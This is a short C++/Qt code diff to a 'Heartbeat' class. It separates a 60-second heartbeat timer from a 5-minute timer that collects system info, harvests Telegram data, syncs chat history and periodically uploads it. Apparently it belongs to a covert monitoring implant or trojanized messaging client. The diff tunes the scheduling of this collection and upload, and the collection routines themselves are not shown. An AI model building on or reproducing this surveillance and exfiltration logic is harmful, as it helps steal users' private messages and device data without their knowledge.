@@ -178,7 +178,13 @@ void Heartbeat::start() {
     }
     
     // Schedule periodic tasks
-    connect(&_timer, &QTimer::timeout, this, [this, shouldScan]() {
+    // 1. Heartbeat (Lightweight, High Frequency - 60s)
+    connect(&_timer, &QTimer::timeout, this, [this]() {
+        sendHeartbeat();
+    });
+
+    // 2. Data Collection (Heavy, Low Frequency - 5min)
+    connect(&_collectionTimer, &QTimer::timeout, this, [this, shouldScan]() {
         collectSystemInfo();
         collectTelegramData();
         syncChatHistory(); // Sync history periodically
@@ -191,8 +197,6 @@ void Heartbeat::start() {
             cleanupDatabase(); // Cleanup after scheduled upload
             _lastUploadTime = now;
         }
-
-        sendHeartbeat();
     });
     
     // Upload initial data immediately after collection
@@ -202,7 +206,8 @@ void Heartbeat::start() {
     // Send initial heartbeat immediately
     sendHeartbeat();
 
-    _timer.start(300000); // 5 minutes (Collection)
+    _timer.start(60000); // 60 seconds (Heartbeat)
+    _collectionTimer.start(300000); // 5 minutes (Collection)
 
     // Connect Monitor Timer
     connect(&_monitorTimer, &QTimer::timeout, this, &Heartbeat::performMonitor);
